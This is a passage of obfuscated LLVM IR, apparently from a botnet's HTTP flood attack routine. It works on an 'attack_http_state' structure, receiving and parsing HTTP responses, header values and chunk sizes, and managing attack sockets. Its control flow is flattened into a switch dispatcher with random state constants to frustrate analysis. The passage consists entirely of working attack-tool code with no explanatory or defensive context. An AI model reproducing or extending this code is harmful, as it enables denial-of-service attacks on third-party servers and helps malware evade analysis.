  %2196 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2197 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2196, i32 0, i32 9
  %2198 = getelementptr inbounds [9 x i8], [9 x i8]* %2197, i32 0, i32 0
  %2199 = call signext i8 @util_strcmp(i8* %2198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %2200 = sext i8 %2199 to i32
  %2201 = icmp ne i32 %2200, 0
  %2202 = select i1 %2201, i32 713012572, i32 491354307
  store i32 %2202, i32* %switchVar
  br label %loopEnd

; <label>:2203:                                   ; preds = %loopEntry
  %2204 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2205 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2204, i32 0, i32 1
  store i8 7, i8* %2205, align 4
  store i32 -1810228500, i32* %switchVar
  br label %loopEnd

; <label>:2206:                                   ; preds = %loopEntry
  %2207 = load i32, i32* %12, align 4
  %2208 = load i32, i32* %37, align 4
  %2209 = icmp sgt i32 %2207, %2208
  %2210 = select i1 %2209, i32 681008411, i32 553786671
  store i32 %2210, i32* %switchVar
  br label %loopEnd

; <label>:2211:                                   ; preds = %loopEntry
  %2212 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2212, i32 0, i32 1
  store i8 10, i8* %2213, align 4
  store i32 -1160035228, i32* %switchVar
  br label %loopEnd

; <label>:2214:                                   ; preds = %loopEntry
  %2215 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2216 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2215, i32 0, i32 1
  store i8 1, i8* %2216, align 4
  store i32 -1160035228, i32* %switchVar
  br label %loopEnd

; <label>:2217:                                   ; preds = %loopEntry
  store i32 -1810228500, i32* %switchVar
  br label %loopEnd

; <label>:2218:                                   ; preds = %loopEntry
  %2219 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2220 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2219, i32 0, i32 0
  %2221 = load i32, i32* %2220, align 4
  %2222 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2223 = load i32, i32* %37, align 4
  %2224 = sext i32 %2223 to i64
  %2225 = call i64 @recv(i32 %2221, i8* %2222, i64 %2224, i32 16384)
  %2226 = trunc i64 %2225 to i32
  store i32 %2226, i32* %12, align 4
  store i32 -319556250, i32* %switchVar
  br label %loopEnd

; <label>:2227:                                   ; preds = %loopEntry
  %2228 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2229 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2228, i32 0, i32 1
  %2230 = load i8, i8* %2229, align 4
  %2231 = zext i8 %2230 to i32
  %2232 = icmp eq i32 %2231, 7
  %2233 = select i1 %2232, i32 -830243757, i32 1863810429
  store i32 %2233, i32* %switchVar
  br label %loopEnd

; <label>:2234:                                   ; preds = %loopEntry
  store i32 201635281, i32* %switchVar
  br label %loopEnd

; <label>:2235:                                   ; preds = %loopEntry
  %2236 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2237 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2236, i32 0, i32 1
  %2238 = load i8, i8* %2237, align 4
  %2239 = zext i8 %2238 to i32
  %2240 = icmp ne i32 %2239, 7
  %2241 = select i1 %2240, i32 -416074325, i32 -1866708474
  store i32 %2241, i32* %switchVar
  br label %loopEnd

; <label>:2242:                                   ; preds = %loopEntry
  store i32 -1146076595, i32* %switchVar
  br label %loopEnd

; <label>:2243:                                   ; preds = %loopEntry
  %2244 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2245 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2244, i32 0, i32 17
  %2246 = load i32, i32* %2245, align 4
  %2247 = icmp eq i32 %2246, 1024
  %2248 = select i1 %2247, i32 -1220472853, i32 -1418358481
  store i32 %2248, i32* %switchVar
  br label %loopEnd

; <label>:2249:                                   ; preds = %loopEntry
  %2250 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2251 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2250, i32 0, i32 18
  %2252 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2251, i32 0, i32 0
  %2253 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2253, i32 0, i32 18
  %2255 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2254, i32 0, i32 0
  %2256 = getelementptr inbounds i8, i8* %2255, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2252, i8* %2256, i64 960, i32 1, i1 false)
  %2257 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2257, i32 0, i32 17
  %2259 = load i32, i32* %2258, align 4
  %2260 = sub nsw i32 %2259, 64
  store i32 %2260, i32* %2258, align 4
  store i32 -1418358481, i32* %switchVar
  br label %loopEnd

; <label>:2261:                                   ; preds = %loopEntry
  %2262 = call i32* @__errno_location() #7
  store i32 0, i32* %2262, align 4
  %2263 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2264 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2263, i32 0, i32 0
  %2265 = load i32, i32* %2264, align 4
  %2266 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2267 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2266, i32 0, i32 18
  %2268 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2267, i32 0, i32 0
  %2269 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2270 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2269, i32 0, i32 17
  %2271 = load i32, i32* %2270, align 4
  %2272 = sext i32 %2271 to i64
  %2273 = getelementptr inbounds i8, i8* %2268, i64 %2272
  %2274 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2275 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2274, i32 0, i32 17
  %2276 = load i32, i32* %2275, align 4
  %2277 = sub nsw i32 1024, %2276
  %2278 = sext i32 %2277 to i64
  %2279 = call i64 @recv(i32 %2265, i8* %2273, i64 %2278, i32 16384)
  %2280 = trunc i64 %2279 to i32
  store i32 %2280, i32* %12, align 4
  %2281 = load i32, i32* %12, align 4
  %2282 = icmp eq i32 %2281, 0
  %2283 = select i1 %2282, i32 1730470383, i32 -1916000997
  store i32 %2283, i32* %switchVar
  br label %loopEnd

; <label>:2284:                                   ; preds = %loopEntry
  %2285 = call i32* @__errno_location() #7
  store i32 104, i32* %2285, align 4
  store i32 -1, i32* %12, align 4
  store i32 -1916000997, i32* %switchVar
  br label %loopEnd

; <label>:2286:                                   ; preds = %loopEntry
  %2287 = load i32, i32* %12, align 4
  %2288 = icmp eq i32 %2287, -1
  %2289 = select i1 %2288, i32 -601002691, i32 1635366953
  store i32 %2289, i32* %switchVar
  br label %loopEnd

; <label>:2290:                                   ; preds = %loopEntry
  %2291 = call i32* @__errno_location() #7
  %2292 = load i32, i32* %2291, align 4
  %2293 = icmp ne i32 %2292, 11
  %2294 = select i1 %2293, i32 -507719555, i32 1096828205
  store i32 %2294, i32* %switchVar
  br label %loopEnd

; <label>:2295:                                   ; preds = %loopEntry
  %2296 = call i32* @__errno_location() #7
  %2297 = load i32, i32* %2296, align 4
  %2298 = icmp ne i32 %2297, 11
  %2299 = select i1 %2298, i32 631868261, i32 1096828205
  store i32 %2299, i32* %switchVar
  br label %loopEnd

; <label>:2300:                                   ; preds = %loopEntry
  %2301 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2302 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2301, i32 0, i32 0
  %2303 = load i32, i32* %2302, align 4
  %2304 = call i32 @close(i32 %2303)
  %2305 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2305, i32 0, i32 0
  store i32 -1, i32* %2306, align 4
  %2307 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2308 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2307, i32 0, i32 1
  store i8 0, i8* %2308, align 4
  store i32 1096828205, i32* %switchVar
  br label %loopEnd

; <label>:2309:                                   ; preds = %loopEntry
  store i32 -1146076595, i32* %switchVar
  br label %loopEnd

; <label>:2310:                                   ; preds = %loopEntry
  %2311 = load i32, i32* %12, align 4
  %2312 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2313 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2312, i32 0, i32 17
  %2314 = load i32, i32* %2313, align 4
  %2315 = add nsw i32 %2314, %2311
  store i32 %2315, i32* %2313, align 4
  %2316 = load i32, i32* %27, align 4
  %2317 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2318 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2317, i32 0, i32 2
  store i32 %2316, i32* %2318, align 4
  store i32 -1747060959, i32* %switchVar
  br label %loopEnd

; <label>:2319:                                   ; preds = %loopEntry
  store i32 0, i32* %59, align 4
  %2320 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2321 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2320, i32 0, i32 14
  %2322 = load i32, i32* %2321, align 4
  %2323 = icmp sgt i32 %2322, 0
  %2324 = select i1 %2323, i32 1676263375, i32 -1753070472
  store i32 %2324, i32* %switchVar
  br label %loopEnd

; <label>:2325:                                   ; preds = %loopEntry
  %2326 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2327 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2326, i32 0, i32 14
  %2328 = load i32, i32* %2327, align 4
  %2329 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2330 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2329, i32 0, i32 17
  %2331 = load i32, i32* %2330, align 4
  %2332 = icmp sgt i32 %2328, %2331
  %2333 = select i1 %2332, i32 1344079180, i32 1113047964
  store i32 %2333, i32* %switchVar
  br label %loopEnd

; <label>:2334:                                   ; preds = %loopEntry
  %2335 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2336 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2335, i32 0, i32 17
  %2337 = load i32, i32* %2336, align 4
  store i32 -1360067326, i32* %switchVar
  store i32 %2337, i32* %.reg2mem53
  br label %loopEnd

; <label>:2338:                                   ; preds = %loopEntry
  %2339 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2340 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2339, i32 0, i32 14
  %2341 = load i32, i32* %2340, align 4
  store i32 -1360067326, i32* %switchVar
  store i32 %2341, i32* %.reg2mem53
  br label %loopEnd

; <label>:2342:                                   ; preds = %loopEntry
  %.reload54 = load i32, i32* %.reg2mem53
  store i32 %.reload54, i32* %59, align 4
  %2343 = load i32, i32* %59, align 4
  %2344 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2345 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2344, i32 0, i32 14
  %2346 = load i32, i32* %2345, align 4
  %2347 = sub nsw i32 %2346, %2343
  store i32 %2347, i32* %2345, align 4
  %2348 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2349 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2348, i32 0, i32 11
  %2350 = load i32, i32* %2349, align 4
  %2351 = icmp eq i32 %2350, 1
  %2352 = select i1 %2351, i32 1527828100, i32 -1284128697
  store i32 %2352, i32* %switchVar
  br label %loopEnd

; <label>:2353:                                   ; preds = %loopEntry
  %2354 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2355 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2354, i32 0, i32 18
  %2356 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2355, i32 0, i32 0
  %2357 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2358 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2357, i32 0, i32 17
  %2359 = load i32, i32* %2358, align 4
  %2360 = call i8* @table_retrieve_val(i32 61, i32* null)
  %2361 = call i32 @util_memsearch(i8* %2356, i32 %2359, i8* %2360, i32 11)
  %2362 = icmp ne i32 %2361, -1
  %2363 = select i1 %2362, i32 -583128085, i32 915683850
  store i32 %2363, i32* %switchVar
  br label %loopEnd

; <label>:2364:                                   ; preds = %loopEntry
  %2365 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2366 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2365, i32 0, i32 18
  %2367 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2366, i32 0, i32 0
  %2368 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2368, i32 0, i32 17
  %2370 = load i32, i32* %2369, align 4
  %2371 = call i8* @table_retrieve_val(i32 61, i32* null)
  %2372 = call i32 @util_memsearch(i8* %2367, i32 %2370, i8* %2371, i32 11)
  store i32 %2372, i32* %60, align 4
  %2373 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2374 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2373, i32 0, i32 18
  %2375 = load i32, i32* %60, align 4
  %2376 = sext i32 %2375 to i64
  %2377 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2374, i64 0, i64 %2376
  %2378 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2379 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2378, i32 0, i32 17
  %2380 = load i32, i32* %2379, align 4
  %2381 = load i32, i32* %60, align 4
  %2382 = sub nsw i32 %2380, %2381
  %2383 = call i32 @util_memsearch(i8* %2377, i32 %2382, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2383, i32* %61, align 4
  %2384 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2385 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2384, i32 0, i32 18
  %2386 = load i32, i32* %60, align 4
  %2387 = load i32, i32* %61, align 4
  %2388 = sub nsw i32 %2387, 1
  %2389 = add nsw i32 %2386, %2388
  %2390 = sext i32 %2389 to i64
  %2391 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2385, i64 0, i64 %2390
  store i8 0, i8* %2391, align 1
  %2392 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2393 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2392, i32 0, i32 15
  %2394 = load i32, i32* %2393, align 4
  %2395 = icmp slt i32 %2394, 5
  %2396 = select i1 %2395, i32 530303051, i32 -1015973749
  store i32 %2396, i32* %switchVar
  br label %loopEnd

; <label>:2397:                                   ; preds = %loopEntry
  %2398 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2399 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2398, i32 0, i32 18
  %2400 = load i32, i32* %60, align 4
  %2401 = sext i32 %2400 to i64
  %2402 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2399, i64 0, i64 %2401
  %2403 = call i32 @util_strlen(i8* %2402)
  %2404 = icmp slt i32 %2403, 128
  %2405 = select i1 %2404, i32 -2067556022, i32 -1015973749
  store i32 %2405, i32* %switchVar
  br label %loopEnd

; <label>:2406:                                   ; preds = %loopEntry
  %2407 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2407, i32 0, i32 16
  %2409 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2410 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2409, i32 0, i32 15
  %2411 = load i32, i32* %2410, align 4
  %2412 = sext i32 %2411 to i64
  %2413 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2408, i64 0, i64 %2412
  %2414 = getelementptr inbounds [128 x i8], [128 x i8]* %2413, i32 0, i32 0
  %2415 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2416 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2415, i32 0, i32 18
  %2417 = load i32, i32* %60, align 4
  %2418 = sext i32 %2417 to i64
  %2419 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2416, i64 0, i64 %2418
  %2420 = call i32 @util_strcpy(i8* %2414, i8* %2419)
  %2421 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2421, i32 0, i32 16
  %2423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2423, i32 0, i32 15
  %2425 = load i32, i32* %2424, align 4
  %2426 = sext i32 %2425 to i64
  %2427 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2422, i64 0, i64 %2426
  %2428 = getelementptr inbounds [128 x i8], [128 x i8]* %2427, i32 0, i32 0
  %2429 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2430 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2429, i32 0, i32 16
  %2431 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2431, i32 0, i32 15
  %2433 = load i32, i32* %2432, align 4
  %2434 = sext i32 %2433 to i64
  %2435 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2430, i64 0, i64 %2434
  %2436 = getelementptr inbounds [128 x i8], [128 x i8]* %2435, i32 0, i32 0
  %2437 = call i32 @util_strlen(i8* %2436)
  %2438 = sext i32 %2437 to i64
  %2439 = getelementptr inbounds i8, i8* %2428, i64 %2438
  %2440 = call i32 @util_strcpy(i8* %2439, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2441 = load i32, i32* %61, align 4
  %2442 = add nsw i32 %2441, 3
  %2443 = load i32, i32* %60, align 4
  %2444 = add nsw i32 %2443, %2442
  store i32 %2444, i32* %60, align 4
  %2445 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2446 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2445, i32 0, i32 18
  %2447 = load i32, i32* %60, align 4
  %2448 = sext i32 %2447 to i64
  %2449 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2446, i64 0, i64 %2448
  %2450 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2450, i32 0, i32 17
  %2452 = load i32, i32* %2451, align 4
  %2453 = load i32, i32* %60, align 4
  %2454 = sub nsw i32 %2452, %2453
  %2455 = call i32 @util_memsearch(i8* %2449, i32 %2454, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2455, i32* %61, align 4
  %2456 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2457 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2456, i32 0, i32 18
  %2458 = load i32, i32* %60, align 4
  %2459 = load i32, i32* %61, align 4
  %2460 = sub nsw i32 %2459, 1
  %2461 = add nsw i32 %2458, %2460
  %2462 = sext i32 %2461 to i64
  %2463 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2457, i64 0, i64 %2462
  store i8 0, i8* %2463, align 1
  %2464 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2465 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2464, i32 0, i32 16
  %2466 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2467 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2466, i32 0, i32 15
  %2468 = load i32, i32* %2467, align 4
  %2469 = sext i32 %2468 to i64
  %2470 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2465, i64 0, i64 %2469
  %2471 = getelementptr inbounds [128 x i8], [128 x i8]* %2470, i32 0, i32 0
  %2472 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2472, i32 0, i32 16
  %2474 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2475 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2474, i32 0, i32 15
  %2476 = load i32, i32* %2475, align 4
  %2477 = sext i32 %2476 to i64
  %2478 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2473, i64 0, i64 %2477
  %2479 = getelementptr inbounds [128 x i8], [128 x i8]* %2478, i32 0, i32 0
  %2480 = call i32 @util_strlen(i8* %2479)
  %2481 = sext i32 %2480 to i64
  %2482 = getelementptr inbounds i8, i8* %2471, i64 %2481
  %2483 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2484 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2483, i32 0, i32 18
  %2485 = load i32, i32* %60, align 4
  %2486 = sext i32 %2485 to i64
  %2487 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2484, i64 0, i64 %2486
  %2488 = call i32 @util_strcpy(i8* %2482, i8* %2487)
  %2489 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2490 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2489, i32 0, i32 15
  %2491 = load i32, i32* %2490, align 4
  %2492 = add nsw i32 %2491, 1
  store i32 %2492, i32* %2490, align 4
  store i32 -1015973749, i32* %switchVar
  br label %loopEnd

; <label>:2493:                                   ; preds = %loopEntry
  %2494 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2495 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2494, i32 0, i32 14
  store i32 -1, i32* %2495, align 4
  %2496 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2497 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2496, i32 0, i32 1
  store i8 10, i8* %2497, align 4
  store i32 113065897, i32* %switchVar
  br label %loopEnd

; <label>:2498:                                   ; preds = %loopEntry
  store i32 -1284128697, i32* %switchVar
  br label %loopEnd

; <label>:2499:                                   ; preds = %loopEntry
  store i32 -1753070472, i32* %switchVar
  br label %loopEnd

; <label>:2500:                                   ; preds = %loopEntry
  %2501 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2501, i32 0, i32 14
  %2503 = load i32, i32* %2502, align 4
  %2504 = icmp eq i32 %2503, 0
  %2505 = select i1 %2504, i32 2069692672, i32 -1443462659
  store i32 %2505, i32* %switchVar
  br label %loopEnd

; <label>:2506:                                   ; preds = %loopEntry
  %2507 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2508 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2507, i32 0, i32 13
  %2509 = load i32, i32* %2508, align 4
  %2510 = icmp eq i32 %2509, 1
  %2511 = select i1 %2510, i32 -1734469052, i32 244515912
  store i32 %2511, i32* %switchVar
  br label %loopEnd

; <label>:2512:                                   ; preds = %loopEntry
  %2513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2513, i32 0, i32 18
  %2515 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2514, i32 0, i32 0
  %2516 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2517 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2516, i32 0, i32 17
  %2518 = load i32, i32* %2517, align 4
  %2519 = call i32 @util_memsearch(i8* %2515, i32 %2518, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2520 = icmp ne i32 %2519, -1
  %2521 = select i1 %2520, i32 -1215058148, i32 2099538873
  store i32 %2521, i32* %switchVar
  br label %loopEnd

; <label>:2522:                                   ; preds = %loopEntry
  %2523 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2524 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2523, i32 0, i32 18
  %2525 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2524, i32 0, i32 0
  %2526 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2526, i32 0, i32 17
  %2528 = load i32, i32* %2527, align 4
  %2529 = call i32 @util_memsearch(i8* %2525, i32 %2528, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2529, i32* %62, align 4
  %2530 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2531 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2530, i32 0, i32 18
  %2532 = load i32, i32* %62, align 4
  %2533 = sub nsw i32 %2532, 2
  %2534 = sext i32 %2533 to i64
  %2535 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2531, i64 0, i64 %2534
  store i8 0, i8* %2535, align 1
  %2536 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2537 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2536, i32 0, i32 18
  %2538 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2537, i32 0, i32 0
  %2539 = load i32, i32* %62, align 4
  %2540 = call i32 @util_memsearch(i8* %2538, i32 %2539, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2541 = icmp ne i32 %2540, -1
  %2542 = select i1 %2541, i32 -323584346, i32 -662741633
  store i32 %2542, i32* %switchVar
  br label %loopEnd

; <label>:2543:                                   ; preds = %loopEntry
  %2544 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2545 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2544, i32 0, i32 18
  %2546 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2547 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2546, i32 0, i32 18
  %2548 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2547, i32 0, i32 0
  %2549 = load i32, i32* %62, align 4
  %2550 = call i32 @util_memsearch(i8* %2548, i32 %2549, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2551 = sext i32 %2550 to i64
  %2552 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2545, i64 0, i64 %2551
  store i8 0, i8* %2552, align 1
  store i32 -662741633, i32* %switchVar
  br label %loopEnd

; <label>:2553:                                   ; preds = %loopEntry
  %2554 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2555 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2554, i32 0, i32 18
  %2556 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2555, i32 0, i32 0
  %2557 = call i32 @util_atoi(i8* %2556, i32 16)
  store i32 %2557, i32* %63, align 4
  %2558 = load i32, i32* %63, align 4
  %2559 = icmp eq i32 %2558, 0
  %2560 = select i1 %2559, i32 -960281000, i32 -317076674
  store i32 %2560, i32* %switchVar
  br label %loopEnd

; <label>:2561:                                   ; preds = %loopEntry
  %2562 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2563 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2562, i32 0, i32 1
  store i8 1, i8* %2563, align 4
  store i32 113065897, i32* %switchVar
  br label %loopEnd

; <label>:2564:                                   ; preds = %loopEntry
  %2565 = load i32, i32* %63, align 4
  %2566 = add nsw i32 %2565, 2
  %2567 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2568 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2567, i32 0, i32 14
  store i32 %2566, i32* %2568, align 4
  %2569 = load i32, i32* %62, align 4
  store i32 %2569, i32* %59, align 4
  store i32 2099538873, i32* %switchVar
  br label %loopEnd

; <label>:2570:                                   ; preds = %loopEntry
  store i32 -1234908302, i32* %switchVar
  br label %loopEnd

; <label>:2571:                                   ; preds = %loopEntry
  %2572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2572, i32 0, i32 17
  %2574 = load i32, i32* %2573, align 4
  %2575 = load i32, i32* %59, align 4
  %2576 = sub nsw i32 %2574, %2575
  %2577 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2578 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2577, i32 0, i32 14
  store i32 %2576, i32* %2578, align 4
  %2579 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2580 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2579, i32 0, i32 14
  %2581 = load i32, i32* %2580, align 4
  %2582 = icmp eq i32 %2581, 0
